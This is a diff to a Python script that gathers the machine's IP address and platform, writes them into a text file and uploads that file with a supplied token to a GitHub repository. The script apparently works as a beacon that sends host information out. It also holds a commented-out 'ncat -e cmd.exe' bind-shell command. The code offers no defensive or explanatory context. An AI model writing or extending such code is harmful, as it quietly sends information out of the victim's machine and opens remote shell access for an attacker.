@@ -16,7 +16,7 @@ def delete_file(file_path):
 
 
 def update_file_on_github(file_path,token):
-    url = f"https://api.github.com/repos/kaki714/Not/contents/data/info.txt"
+    url = f"https://api.github.com/repos/kaki714/Not/contents/data/data.txt"
     headers = {
         'Accept': 'application/vnd.github.v3+json',
         'Authorization': f'token {token}'
@@ -60,6 +60,7 @@ def run(token):
     hostname=socket.gethostname()   
     IPAddr=socket.gethostbyname(hostname) 
     iph='172.20.10.3'
+    fname="data.txt"
     print('')
     print(' ############### # # # ##############')
     print(' ####### ###### # #  # # ####### ####')
@@ -81,9 +82,9 @@ def run(token):
         print('Address ip: ', IPAddr)
         print('TokenData: ', token)
         stmnt= 'Info: '+ IPAddr+'    |   '+sysconfig.get_platform()
-        create_file("data.txt",stmnt)
+        create_file(fname,stmnt)
         #subir_archivo('data.txt', stmnt )
-        update_file_on_github(stmnt",token)
+        update_file_on_github(fname,token)
         #delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
